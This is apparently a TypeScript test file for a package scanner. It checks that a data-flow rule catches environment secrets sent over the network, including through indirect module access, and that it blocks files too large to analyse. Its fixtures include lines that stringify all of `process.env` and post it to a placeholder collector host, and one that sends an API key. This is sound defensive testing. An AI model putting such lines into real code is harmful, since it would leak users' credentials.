import { describe, expect, it } from "vitest";
import { checkFiles } from "../checks/index.ts";
import { folder } from "../testing.ts";
import type { CorpusSample } from "./corpus-malicious.ts";
import { flowR3Benign, flowR3Corpus } from "./corpus-r3-flow.ts";
import { analyse, jsFlow } from "./dataflow.ts";
import { nodeCap, parseJs, walk } from "./js-ast.ts";
import { disposition, scanEntry, type ScanContext } from "./index.ts";
import { viewOf } from "./script-view.ts";

/*
 * The data-flow rule through module identities (ADR 0173 §8): a sensitive module reached through
 * `require`, `import`, destructuring, `Reflect.get` or `globalThis` is the source a literal
 * `process.env` is, and the rule fails closed: an unresolved sensitive read beside a sink, code
 * it can't parse, and a walk cut short are held, never passed.
 */

const context: ScanContext = { entries: [], verified: [] };

function scanned(sample: CorpusSample) {
  const files = folder(sample.files);
  const checked = checkFiles(sample.type, sample.name, files);
  const report = scanEntry({
    type: sample.type,
    name: sample.name,
    files,
    listing: checked.listing,
    inspection: checked.inspection,
    context,
  });
  const outcome = disposition(report, {
    newPublisher: false,
    firstVersion: false,
    official: false,
    approved: false,
  });
  return { report, outcome };
}

describe("sensitive modules reached indirectly", () => {
  it.each(flowR3Corpus.map((sample) => [sample.id, sample] as const))(
    "%s is caught",
    (_id, sample) => {
      const { report, outcome } = scanned(sample);
      const flow = report.findings.filter((finding) => finding.rule.startsWith("sensitive-exfil"));
      if (sample.expect === "block") {
        expect(report.verdict).toBe("block");
        expect(flow.map((finding) => finding.level)).toContain("block");
      } else {
        expect(outcome).not.toBe("list");
        expect(flow.length).toBeGreaterThan(0);
      }
    },
  );

  it.each(flowR3Benign.map((sample) => [sample.id, sample] as const))(
    "%s stays clean",
    (_id, sample) => {
      expect(scanned(sample).report.verdict).toBe("pass");
    },
  );

  it("holds one named environment value sent, rather than blocking it", () => {
    const view = viewOf(
      "scripts/a.mjs",
      'const key = require("process").env.API_KEY;\nawait fetch("https://api.example.invalid", { headers: { key } });\n',
    );
    expect(jsFlow(view).map((hit) => hit.level)).toEqual(["warn"]);
  });
});

describe("an analysis cut short", () => {
  const source =
    'const body = JSON.stringify(process.env);\nawait fetch("https://collect.example.invalid", { body });\n';

  it("blocks a file whose walk stops at the node cap", () => {
    const view = viewOf("scripts/big.mjs", source);
    const parsed = parseJs(view.text, { typescript: false });
    if (!parsed) throw new Error("the sample parses");
    // A walk that stops after a few nodes, as the real one does at the cap.
    let budget = 0;
    const capped: typeof walk = (root, visit) =>
      walk(root, (node, parent) => {
        if (++budget <= 3) visit(node, parent);
      }) && budget <= 3;
    const hits = analyse(view, parsed.program, false, false, capped);
    expect(hits.some((hit) => hit.level === "block" && /too large/.test(hit.message))).toBe(true);
  });

  it("holds a real file past the node cap", () => {
    const filler = "0,".repeat(nodeCap + 10);
    const view = viewOf("scripts/big.mjs", `const pad = [${filler}];\n${source}`);
    const hits = jsFlow(view);
    expect(hits.some((hit) => /too large/.test(hit.message))).toBe(true);
  });
});
